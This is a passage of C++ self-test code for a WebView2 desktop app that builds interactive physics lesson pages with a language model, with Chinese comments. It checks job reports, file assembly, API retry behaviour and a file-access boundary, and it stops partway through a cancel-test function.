        const Json full = jobs_.Get(jobId, true);
        if (full.is_object()) {
            if (full.contains("report") && full["report"].is_object()) {
                const Json& rep = full["report"];
                if (rep.contains("items") && rep["items"].is_array() && !rep["items"].empty()) {
                    hasReport = true;
                    reportItems = static_cast<int>(rep["items"].size());
                    allItemsOk = true;
                    for (const Json& it : rep["items"]) {
                        if (!it.is_object()) continue;
                        if (it.contains("ok") && it["ok"].is_boolean() && !it["ok"].get<bool>()) allItemsOk = false;
                        if (it.value("key", std::string()) == "demo-checks") {
                            hasDemoItem = true;
                            if (it.contains("ok") && it["ok"].is_boolean() && !it["ok"].get<bool>()) {
                                badDemoItem = true;
                                const std::string note = it.value("note", std::string());
                                const std::string raw = it.value("raw", std::string());
                                if (note.find("999999") != std::string::npos
                                    || raw.find("999999") != std::string::npos) {
                                    demoNoteHas999 = true;
                                }
                            }
                        }
                    }
                }
            }
            if (full.contains("stages") && full["stages"].is_array()) {
                for (const Json& st : full["stages"]) {
                    if (st.value("key", std::string()) == "verify"
                        && st.value("status", std::string()) == "done") verifyStageDone = true;
                    if (st.value("key", std::string()) == "repair"
                        && st.value("status", std::string()) == "done") {
                        repairStageDone = true;
                        repairDetail = st.value("detail", std::string());
                    }
                }
            }
            if (full.contains("logs") && full["logs"].is_array()) {
                for (const Json& l : full["logs"]) {
                    if (!l.is_object()) continue;
                    const std::string m = l.value("message", std::string());
                    if (m.find("页内校验全部通过") != std::string::npos
                        || m.find("校验有") != std::string::npos) sawVerifyLog = true;
                    if (m.find("已重出") != std::string::npos) sawDemoRegen = true;
                }
            }
        }
    }
    const bool repairMode = (opt_.selftest == "pipeline-repair");
    add(hasReport, "探针报告回到了宿主（job.report.items 非空）",
        std::to_string(reportItems) + " 项");
    if (repairMode) {
        /* 这一套故意让假模型的演示 checks 写错：探针必须发现，修复轮必须真的跑。
           假模型不会"改对"，所以修完仍有 1 项没过 —— 这反而证明修复轮没有被静默跳过。 */
        add(badDemoItem, "demo-checks 抓到了那处读数不一致（报告里有 ok=false 的演示项）");
        /* 证明失败**正是**代理注入的那处读数，而不是"任意原因失败"（超时/元素找不到
           也会让 ok=false，那样这条判据就区分不出变异有没有生效）。 */
        add(demoNoteHas999, "失败原因里带着注入的 999999（不是超时/找不到元素之类的假失败）");
        add(repairStageDone, "repair 阶段跑完了（不是 skipped）", repairDetail);
        add(repairDetail.find("仍有") != std::string::npos,
            "修复后如实写出「仍有 N 项没过」（没有假装全绿）", repairDetail);
        add(sawDemoRegen, "日志里有「演示 … 已重出」（修复轮真的重出了演示）");
    } else {
        add(allItemsOk, "报告里没有判 false 的项（真实探针跑完这一页）");
        add(hasDemoItem, "报告里有「演示读数与公式是否自洽」这一项（demo-checks 真的跑了）");
    }
    add(verifyStageDone, "verify 阶段状态是 done（不是 failed/skipped）");
    add(sawVerifyLog, "任务日志里有校验结论（全部通过 / N 项没过）");

    /* Phase 5 的 DoD 是「真 PDF → 真拼装 → 真探针 → 假模型」：e2e-mock 这一套
       必须证明抽取阶段真的跑了 PDF，而不是拿一份 Markdown 冒充。 */
    if (opt_.selftest == "e2e-mock") {
        std::wstring fx = opt_.pipelineFixture;
        std::wstring low = fx;
        std::transform(low.begin(), low.end(), low.begin(), [](wchar_t c) {
            return (c >= L'A' && c <= L'Z') ? static_cast<wchar_t>(c - L'A' + L'a') : c;
        });
        add(low.size() > 4 && low.compare(low.size() - 4, 4, L".pdf") == 0,
            "e2e-mock 的输入是一份真 PDF", to_utf8(fx));
        bool extractDone = false;
        std::string extractDetail;
        if (!jobId.empty()) {
            const Json full = jobs_.Get(jobId, true);
            if (full.is_object() && full.contains("stages") && full["stages"].is_array()) {
                for (const Json& st : full["stages"]) {
                    if (st.value("key", std::string()) == "extract"
                        && st.value("status", std::string()) == "done") {
                        extractDone = true;
                        extractDetail = st.value("detail", std::string());
                    }
                }
            }
        }
        add(extractDone, "extract 阶段真的跑完了（PDFium 抽取）", extractDetail);
        add(!extractDetail.empty(), "extract 阶段报出了页数/字数", extractDetail);
    }

    /* 页面若报 bad=0 但 lines 里有 [BAD]，宿主不能照单全收。 */
    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) badLines++;
    }
    if (badLines > bad) bad = badLines;

    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "pipeline-mock 完成");
}

/* ---------------- Phase 5：真探针自测 ---------------- */

void AppWindow::RunVerifyScript() {
    std::wstring fixture = opt_.verifyFixture;
    if (fixture.empty()) {
        fixture = exe_dir() + L"\\..\\..\\..\\..\\spike\\_fixtures\\real-chapter.html";
    }
    if (!stat_path(fixture).isFile) {
        Report("[BAD] verify 自测找不到基准页：" + to_utf8(fixture)
               + "（用 --verify-fixture= 指定一份真实产物页）");
        Finish(2, "缺少 verify 夹具");
        return;
    }
    std::string html;
    if (!read_file_bytes(fixture, html)) {
        Report("[BAD] 读不出 verify 基准页：" + to_utf8(fixture));
        Finish(2, "读不出 verify 夹具");
        return;
    }
    const std::wstring dir = user_data_dir() + L"\\selftest\\verify";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(dir), ec);
    const std::wstring good = dir + L"\\good.html";
    const std::wstring broken = dir + L"\\broken.html";
    const std::wstring tiny = dir + L"\\tiny-demo.html";
    write_file_bytes(good, html);
    /* 反例：把第一段题库脚本的 `data-bank` 属性改坏 → 引擎不认它，探针必须报"题库条目=0"。
       这是"检查会失败"的证据；只跑好页面的那一套永远证明不了探针在干活。 */
    std::string badHtml = html;
    /* 只改**真正的题库脚本标记**（`<script data-bank`）。直接找第一个 "data-bank"
       会命中引擎 JS 里的字符串常量（oracle 也踩过同一个坑：grep 出来的次数比段数多）。 */
    for (size_t at = badHtml.find("<script data-bank");
         at != std::string::npos;
         at = badHtml.find("<script data-bank", at + 18)) {
        badHtml.replace(at, 17, "<script data-bankx");
    }
    write_file_bytes(broken, badHtml);
    write_file_bytes(tiny,
        "<!doctype html><meta charset=\"utf-8\"><title>tiny demo</title>"
        "<input type=\"range\" id=\"r\" min=\"0\" max=\"10\" step=\"1\" value=\"0\">"
        "<b id=\"o\">0</b><script>var r=document.getElementById('r'),o=document.getElementById('o');"
        "function u(){o.textContent=String(Number(r.value)*2);}"
        "r.addEventListener('input',u);u();</script>");
    protocol_allow(dir);

    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    std::wstring script = to_wide(selftest_verify_script());
    script = replace_wstr(script, L"__VERIFY_GOOD__", to_wide(json_quote(to_utf8(good))));
    script = replace_wstr(script, L"__VERIFY_BAD__", to_wide(json_quote(to_utf8(broken))));
    script = replace_wstr(script, L"__VERIFY_TINY__", to_wide(json_quote(to_utf8(tiny))));
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] verify 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "verify 脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleVerifyResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) ++bad;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };
    /* 宿主独立核对：探针副本必须收干净（临时文件泄漏在"长驻窗口宿主"里是要命的）。 */
    const std::wstring dir = user_data_dir() + L"\\selftest\\verify";
    int leftovers = 0;
    for (const std::wstring& n : list_dir(dir)) {
        if (n.rfind(L"_probe_", 0) == 0) ++leftovers;
    }
    add(leftovers == 0, "探针副本在收尾时删干净了", std::to_string(leftovers) + " 个残留");
    add(stat_path(dir + L"\\broken.html").isFile, "反例页面还在（没有被误删）");
    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) ++badLines;
    }
    if (badLines > bad) bad = badLines;
    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "verify 自测完成");
}

/* ---------------- Phase 6：「带上一章」的通道自测 ---------------- */

void AppWindow::RunBookScript() {
    std::wstring fixture = opt_.bookFixture;
    if (fixture.empty()) fixture = opt_.verifyFixture;
    if (fixture.empty()) {
        fixture = exe_dir() + L"\\..\\..\\..\\..\\spike\\_fixtures\\real-chapter.html";
    }
    if (!stat_path(fixture).isFile) {
        Report("[BAD] book 自测找不到基准页：" + to_utf8(fixture)
               + "（用 --book-fixture= 指定一份真实产物页）");
        Finish(2, "缺少 book 夹具");
        return;
    }
    std::string html;
    if (!read_file_bytes(fixture, html)) {
        Report("[BAD] 读不出 book 基准页：" + to_utf8(fixture));
        Finish(2, "读不出 book 夹具");
        return;
    }
    const std::wstring dir = user_data_dir() + L"\\selftest\\book";
    const std::wstring secretDir = user_data_dir() + L"\\selftest\\book-secret";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(dir), ec);
    std::filesystem::create_directories(std::filesystem::path(secretDir), ec);
    const std::wstring side = dir + L"\\side.html";
    const std::wstring plain = dir + L"\\plain.html";
    const std::wstring junk = dir + L"\\junk.html";
    const std::wstring secret = secretDir + L"\\secret.html";
    const std::wstring md = dir + L"\\lesson.md";
    write_file_bytes(side, html);
    write_file_bytes(plain, html);
    write_file_bytes(junk, "<!doctype html><html><body>这不是一份讲练一体页面</body></html>");
    write_file_bytes(secret, html);
    write_file_bytes(md, "# 材料\n\n这一节讲磁介质。\n");

    const std::string sidecar = R"JSON({
  "schema": "isg-book/1",
  "kind": "book",
  "title": "大学物理",
  "subject": "大学物理学",
  "key": "book-key-test",
  "chapters": [
    { "chapter": {"no":"13","title":"磁介质","subject":"大学物理学","intro":"导语"},
      "key": "ch13-key",
      "units": [{ "id":"u1","num":"13.1","title":"磁化","shortTitle":"13.1","qsecTitle":"练一练",
                  "lede":"导读","lectureHtml":"<p>正文</p>",
                  "bank":[{"id":"q1","type":"single","stem":"题","opts":[],"ans":0}] }],
      "demos": [] },
    { "chapter": {"no":"14","title":"电磁感应"}, "key": "ch14-key", "units": [], "demos": [] }
  ]
})JSON";
    write_file_bytes(side + L".isg.json", sidecar);

    protocol_allow(dir);
    protocol_allow(md);
    /* secretDir **故意不放行**：用它验"报一个路径读任意文件"那条边界。 */

    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    std::wstring script = to_wide(selftest_book_script());
    auto sub = [&](const wchar_t* key, const std::wstring& value) {
        script = replace_wstr(script, key, to_wide(json_quote(to_utf8(value))));
    };
    sub(L"__BOOK_SIDE__", side);
    sub(L"__BOOK_PLAIN__", plain);
    sub(L"__BOOK_JUNK__", junk);
    sub(L"__BOOK_SECRET__", secret);
    sub(L"__BOOK_MD__", md);
    sub(L"__BOOK_OUT__", dir);
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] book 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "book 脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleBookResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) ++bad;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };
    const std::wstring dir = user_data_dir() + L"\\selftest\\book";
    add(stat_path(dir + L"\\side.html").isFile, "夹具页面还在（inspect 只读，不删东西）");
    add(stat_path(dir + L"\\plain.html").isFile, "反推用的页面还在");
    add(stat_path(dir + L"\\side.html.isg.json").isFile, "旁挂数据还在");
    int leftovers = 0;
    for (const std::wstring& n : list_dir(dir)) {
        if (n.rfind(L"_probe_", 0) == 0) ++leftovers;
    }
    add(leftovers == 0, "没有留下临时探针副本", std::to_string(leftovers) + " 个残留");

    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) ++badLines;
    }
    if (badLines > bad) bad = badLines;
    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "book 自测完成");
}

void AppWindow::RunBookE2eScript() {
    if (opt_.pipelineFixture.empty() || opt_.pipelineOut.empty()) {
        Report("[BAD] book-e2e 需要 --pipeline-fixture= 与 --pipeline-out=");
        Finish(2, "缺少 book-e2e 参数");
        return;
    }
    protocol_allow(opt_.pipelineFixture);
    protocol_allow(opt_.pipelineOut);
    pipelineStartMs_ = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::system_clock::now().time_since_epoch()).count();
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    std::wstring script = to_wide(selftest_book_e2e_script());
    script = replace_wstr(script, L"__ISG_PIPELINE_FIXTURE__",
                          to_wide(json_quote(to_utf8(opt_.pipelineFixture))));
    script = replace_wstr(script, L"__ISG_PIPELINE_OUT__",
                          to_wide(json_quote(to_utf8(opt_.pipelineOut))));
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] book-e2e 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "book-e2e 脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleBookE2eResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) ++bad;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };

    const std::string h1s = payload.value("htmlPath1", std::string());
    const std::string h2s = payload.value("htmlPath2", std::string());
    std::string h1, h2;
    const bool ok1 = !h1s.empty() && read_file_bytes(to_wide(h1s), h1);
    const bool ok2 = !h2s.empty() && read_file_bytes(to_wide(h2s), h2);
    add(ok1 && ok2, "宿主读到了两次产物", h1s + " / " + h2s);
    add(!h1s.empty() && !h2s.empty() && h1s != h2s, "两次产物是两个不同的文件");
    if (ok1) {
        add(stat_path(to_wide(h1s)).mtimeMs >= pipelineStartMs_ - 500,
            "第 1 份产物也是本次新写的（不是上一轮的旧文件）");
    }
    if (ok2) {
        add(stat_path(to_wide(h2s)).mtimeMs >= pipelineStartMs_ - 500,
            "第 2 份产物是本次新写的（mtime 晚于测试开始）");
        /* 一册：两份章节内容都在。模型给出的章标题固定，这里按"一册"的结构特征验。 */
        add(h2.find("data-bank") != std::string::npos, "一册里有题库脚本块");
        add(h2.find("id=\"s-total\"") != std::string::npos, "一册里有吸顶进度条");
        add(h2.find("进度搬家") != std::string::npos || h2.find("__mig") != std::string::npos,
            "一册里有进度搬家脚本（新章与册的存盘键不同）");
        /* 章号不能被数组序号顶掉：带过来的章与本次新章各自保留自己的号。
           （旁挂数据的 `no` 归一那次改动就是为了这条。） */
        const bool no13 = h2.find("第 13 章") != std::string::npos;
        const bool no14 = h2.find("第 14 章") != std::string::npos;
        add(no13 && no14, "一册里两章各自的章号都在（第 13 章 / 第 14 章）",
            std::string(no13 ? "" : "缺13 ") + std::string(no14 ? "" : "缺14"));
        /* 冻结章的作答点 id 一个字都不许改；新章则落到自己的命名空间。 */
        if (ok1) {
            /* 用第一份产物里真实存在的第一个题库 id 做哨兵，而不是猜一个名字。 */
            const size_t bank = h1.find("data-bank");
            const size_t at = bank == std::string::npos ? std::string::npos
                                                        : h1.find("\"id\":\"", bank);
            std::string sentinel;
            if (at != std::string::npos) {
                const size_t from = at + 6;
                const size_t to = h1.find('"', from);
                if (to != std::string::npos) sentinel = h1.substr(from, to - from);
            }
            const bool kept = !sentinel.empty()
                              && h1.find("\"" + sentinel + "\"") != std::string::npos
                              && h2.find("\"" + sentinel + "\"") != std::string::npos;
            add(kept, "带过来的章：作答点 id 与它单独成页时一致（冻结，进度不丢）", sentinel);
            const bool namespaced = !sentinel.empty()
                                    && h2.find("\"c2-" + sentinel + "\"") != std::string::npos;
            add(namespaced, "新章落在自己的命名空间（c2-…），两章的 id 不撞车",
                "c2-" + sentinel);
        }
        /* 两章都有演示时，拼装器会把后一个 demoA 改名成 demoB。
           demo-checks 必须拿**最终 id** 去核对，否则会读到另一章的同名演示。 */
        add(h2.find("id=\"demoB\"") != std::string::npos,
            "撞名的演示被改成了 demoB（最终 id 与 input 不同）");
        const std::string jobId2 = payload.value("jobId2", std::string());
        if (!jobId2.empty()) {
            const Json full = jobs_.Get(jobId2, true);
            bool okRep = false;
            int nItems = 0;
            if (full.is_object() && full.contains("report") && full["report"].is_object()
                && full["report"].contains("items") && full["report"]["items"].is_array()) {
                okRep = true;
                for (const Json& it : full["report"]["items"]) {
                    ++nItems;
                    if (it.is_object() && it.contains("ok") && it["ok"].is_boolean()
                        && !it["ok"].get<bool>()) okRep = false;
                }
            }
            add(okRep && nItems > 0,
                "第二册的探针/demo 核对没有 false 项（跨章演示 id 对上了）",
                std::to_string(nItems) + " 项");
        }
    }

    const std::string side2 = payload.value("chapterFile2", std::string());
    add(!side2.empty() && stat_path(to_wide(side2)).isFile, "第 2 份旁挂数据结构落盘了", side2);
    /* `chapterFile` 必须是**这一份页面旁边**那个文件，不能是任意一个存在的路径。 */
    add(!side2.empty() && side2 == h2s + ".isg.json",
        "chapterFile 就是 <页面>.isg.json（不是随便一个存在的文件）",
        side2 + " vs " + h2s + ".isg.json");
    if (!side2.empty()) {
        const book::ReadResult rb = book::read_book(to_wide(h2s));
        add(rb.ok(), "宿主能读回这份旁挂数据", rb.detail);
        if (rb.ok()) {
            const Json& chs = rb.book["chapters"];
            add(chs.is_array() && chs.size() == 2, "旁挂数据里是**两章**（不是只有新章）",
                std::to_string(chs.is_array() ? chs.size() : 0));
            if (chs.is_array() && !chs.empty()) {
                /* 旁挂数据的形状由 oracle 的 book.js 归一：章头只留 no/title/subject/intro，
                   `frozen` 在**条目这一层**（`x.frozen`），不在 chapter 里。 */
                const bool frozen = chs[0].value("frozen", false);
                add(frozen, "带过来的那一章在旁挂数据里标了 frozen:true");
            }
        }
        /* 断言册的顶层 key **等于第一份产物的 key**：再加一章时它不变，
           否则每加一章都得把全册进度搬一次家（而搬家的失败模式是静默串档）。 */
        if (rb.ok()) {
            const std::string k = rb.book.contains("key") && rb.book["key"].is_string()
                                      ? rb.book["key"].get<std::string>() : std::string();
            Json first = Json();
            std::string err;
            const bool firstOk = !h1s.empty()
                && json_read_file(to_wide(h1s + ".isg.json"), first, err)
                && first.is_object() && first.contains("key") && first["key"].is_string();
            const std::string k1 = firstOk ? first["key"].get<std::string>() : std::string();
            add(!k.empty() && !k1.empty() && k == k1,
                "册的顶层存盘键 = 第一份产物的键（加章不搬家）", k + " vs " + k1);
        }
    }

    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) ++badLines;
    }
    if (badLines > bad) bad = badLines;
    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "book-e2e 自测完成");
}

void AppWindow::RunMultiSourceScript() {
    if (opt_.pipelineFixture.empty() || opt_.pipelineOut.empty()) {
        Report("[BAD] multi-source 需要 --pipeline-fixture= 与 --pipeline-out=");
        Finish(2, "缺少 multi-source 参数");
        return;
    }
    std::string content;
    if (!read_file_bytes(opt_.pipelineFixture, content)) {
        Report("[BAD] 读不出 multi-source 的素材：" + to_utf8(opt_.pipelineFixture));
        Finish(2, "读不出素材");
        return;
    }
    const std::wstring dir = opt_.pipelineOut;
    const std::wstring src1 = dir + L"\\courseware.md";
    const std::wstring src2 = dir + L"\\exam.md";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(dir), ec);
    write_file_bytes(src1, content);
    write_file_bytes(src2, content);
    protocol_allow(dir);
    pipelineStartMs_ = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::system_clock::now().time_since_epoch()).count();
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    std::wstring script = to_wide(selftest_multi_source_script());
    script = replace_wstr(script, L"__MS_FIXTURE1__", to_wide(json_quote(to_utf8(src1))));
    script = replace_wstr(script, L"__MS_FIXTURE2__", to_wide(json_quote(to_utf8(src2))));
    script = replace_wstr(script, L"__MS_OUT__", to_wide(json_quote(to_utf8(dir))));
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] multi-source 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "multi-source 脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleMultiSourceResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) ++bad;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };
    const std::string htmlPath = payload.value("htmlPath", std::string());
    std::string html;
    const bool read = !htmlPath.empty() && read_file_bytes(to_wide(htmlPath), html);
    add(read, "宿主读到了多来源产物", htmlPath);
    if (read) {
        add(stat_path(to_wide(htmlPath)).mtimeMs >= pipelineStartMs_ - 500,
            "产物是本次新写的（mtime 晚于测试开始）");
        /* 假模型的 `noteFor('exampaper')` 里带 MARK-EXAM；出题提示词若真的带上了
           真题分析结论，第一道题的题干会带这个记号。搜到它就同时证明：
           ① 两份来源各做了一次独立分析；② 结论进了后续提示词；③ 落进了页面。 */
        add(html.find("MARK-EXAM") != std::string::npos,
            "真题分析的哨兵进了产出页（多来源分析真的融合了）");
    }
    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) ++badLines;
    }
    if (badLines > bad) bad = badLines;
    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "multi-source 自测完成");
}

void AppWindow::RunNetScript() {
    bridge_.SetTraceSink([this](const std::string& text) { Report("[net trace] " + text); });
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    const std::string& script = selftest_net_script();
    webview_->ExecuteScript(
        to_wide(script).c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] net 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "net 自测脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleNetResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) bad++;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };

    Json reqs = Json::array();
    if (!opt_.netRequests.empty()) {
        std::string text;
        if (read_file_bytes(opt_.netRequests, text)) {
            size_t pos = 0;
            while (pos < text.size()) {
                size_t eol = text.find('\n', pos);
                if (eol == std::string::npos) eol = text.size();
                const std::string line = text.substr(pos, eol - pos);
                pos = eol + 1;
                if (line.empty()) continue;
                Json j;
                std::string err;
                if (json_parse(line, j, err) && j.is_object()) reqs.push_back(j);
            }
        }
    }
    /* 请求记录里现在还有一次 GET /models（测试连接排在 chat 之前，专门验
       "首次使用设置页的测试连接"）。下面的 chat 序列只取 POST /chat/completions。 */
    Json chats = Json::array();
    for (const Json& r : reqs) {
        if (!r.is_object()) continue;
        const std::string method = (r.contains("method") && r["method"].is_string())
                                       ? r["method"].get<std::string>() : std::string();
        const std::string u = (r.contains("url") && r["url"].is_string())
                                  ? r["url"].get<std::string>() : std::string();
        if (method == "POST" && u.find("/chat/completions") != std::string::npos) chats.push_back(r);
    }
    add(chats.size() >= 4, "故障服务收到了 ≥ 4 次 chat 请求（两次 400 + 一次 429 + 最终成功）",
        std::to_string(chats.size()) + " 次 chat / " + std::to_string(reqs.size()) + " 次总请求");

    auto body = [&](size_t i) -> Json {
        return (i < chats.size() && chats[i].contains("body") && chats[i]["body"].is_object())
                   ? chats[i]["body"] : Json::object();
    };
    auto has = [&](const Json& o, const char* k) { return o.is_object() && o.contains(k); };
    if (chats.size() >= 4) {
        add(has(body(0), "response_format"), "第 1 次请求带了 response_format（JSON 模式真的发出去了）");
        add(has(body(0), "stream_options"), "第 1 次请求带了 stream_options");
        add(!has(body(1), "response_format"), "第 2 次请求**去掉了** response_format（400 降级生效）");
        add(has(body(1), "stream_options"), "第 2 次请求仍带着 stream_options");
        add(!has(body(2), "response_format") && !has(body(2), "stream_options"),
            "第 3 次请求既没有 response_format 也没有 stream_options");
        add(!has(body(3), "response_format") && !has(body(3), "stream_options"),
            "第 4 次（成功那次）仍然没有那两个被降级的字段");
        add(body(3).value("stream", false) == true, "成功那次是流式请求（stream:true）");
        add(body(3).value("model", std::string()) == "mock-large", "model 原样传到了线上",
            body(3).value("model", std::string()));
        const double temp = body(3).contains("temperature") && body(3)["temperature"].is_number()
                                ? body(3)["temperature"].get<double>() : -999;
        add(temp == 0.1, "temperature 原样传到了线上", std::to_string(temp));
        add(body(3).value("max_tokens", 0) == 123, "max_tokens 原样传到了线上",
            std::to_string(body(3).value("max_tokens", 0)));
        const Json rf = body(0).contains("response_format") ? body(0)["response_format"] : Json();
        add(rf.is_object() && rf.value("type", std::string()) == "json_object",
            "response_format 的形状是 {type:'json_object'}",
            rf.is_object() ? rf.dump() : "(没有)");
        const Json so = body(0).contains("stream_options") ? body(0)["stream_options"] : Json();
        add(so.is_object() && so.value("include_usage", false) == true,
            "stream_options 的形状是 {include_usage:true}",
            so.is_object() ? so.dump() : "(没有)");
        const Json msgs = body(3).contains("messages") ? body(3)["messages"] : Json::array();
        add(msgs.is_array() && msgs.size() == 1
                && msgs[0].value("role", std::string()) == "user"
                && msgs[0].value("content", std::string()) == "ping",
            "messages 的形状与内容没被改过");

        const Json headers = chats[3].contains("headers") ? chats[3]["headers"] : Json::object();
        const std::string auth = headers.value("authorization", std::string());
        const std::string key = env_get("ISG_API_KEY");
        if (!key.empty()) {
            add(auth == ("Bearer " + key), "宿主在发出前注入了真 Key（页面里只有哨兵）",
                auth.empty() ? "(没有 Authorization)" : "Authorization 已存在且长度=" + std::to_string(auth.size()));
        } else {
            /* 本机端点可以没有 Key（与 oracle 的 isLocalBase 对齐）：此时不应凭空造一个
               `Bearer `（空令牌）发出去 —— 那会被一些本机网关当成坏凭据直接拒。 */
            add(auth.empty(), "本机端点没有 Key 时不发 Authorization 头",
                auth.empty() ? "(没有 Authorization)" : auth);
        }
        add(headers.value("content-type", std::string()).find("application/json") != std::string::npos,
            "Content-Type 是 application/json");
    }

    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "net-fault 完成");
}

void AppWindow::RunCancelScript() {
    if (opt_.pipelineFixture.empty() || opt_.pipelineOut.empty()) {
        Report("[BAD] pipeline-cancel 需要 --pipeline-fixture= 与 --pipeline-out=");
